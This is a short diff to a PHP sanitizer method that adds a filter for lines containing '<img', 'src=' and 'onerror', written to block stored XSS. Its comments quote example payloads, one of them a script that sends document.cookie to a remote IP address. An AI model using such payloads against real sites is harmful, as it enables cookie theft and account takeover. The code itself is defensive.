@@ -553,7 +553,14 @@ class Common_Methods {
                 // 1. Stored XSS vulnerability: <script>new Image().src='http://10.5.7.89:8001/index.php?c='+document.cookie</script>
                 // This line of code will send cookies from users browser to a remote server for exploitation
             } else {
-                $sanitized_code_lines[] = $code_line;
+                if ( false !== strpos( $code_line, '<img' ) && false !== strpos( $code_line, 'src=' ) && false !== strpos( $code_line, 'onerror' ) ) {
+                    // Do nothing. Do not include the code line in the sanitized code.
+                    // Example of malicious code:
+                    // 1. Stored XSS vulnerability: <img src=x onerror=alert(1)>
+                    // This may entail account takeover backdoor
+                } else {
+                    $sanitized_code_lines[] = $code_line;
+                }
             }
         }
         $sanitized_code = implode( PHP_EOL, $sanitized_code_lines );
